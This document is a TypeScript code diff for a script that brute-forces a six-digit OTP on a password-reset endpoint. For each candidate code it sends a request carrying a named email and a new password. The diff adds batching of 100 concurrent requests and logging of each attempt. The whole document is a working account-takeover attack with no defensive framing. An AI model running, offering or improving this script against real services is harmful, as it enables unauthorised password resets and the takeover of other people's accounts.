@@ -3,7 +3,7 @@ async function hit(otp:string){
     let data = JSON.stringify({
         "email": "ash@gmail.com",
         "otp": otp,
-        "newPassword": "913325"
+        "newPassword": "111111"
       });
       
       let config = {
@@ -17,6 +17,7 @@ async function hit(otp:string){
       };
       try{
           await axios.request(config);
+          console.log("done for " + otp);
       }
       catch(e){
       
@@ -24,14 +25,17 @@ async function hit(otp:string){
 }
 
 async function main(){
-    const promise = []
+    
     for(let i=0;i<=999999;i+=100){
+      const p = []
         console.log(i);
-        for(let j=i;j<100;j++){
-            promise.push(hit((i + j).toString()))
+        //Let's apply batching...
+        for(let j=0;j<100;j++){
+            p.push(hit((i + j).toString()))
         }
+        await Promise.all(p);
     }
-    await Promise.all(promise);
+    
 }
 
 main();
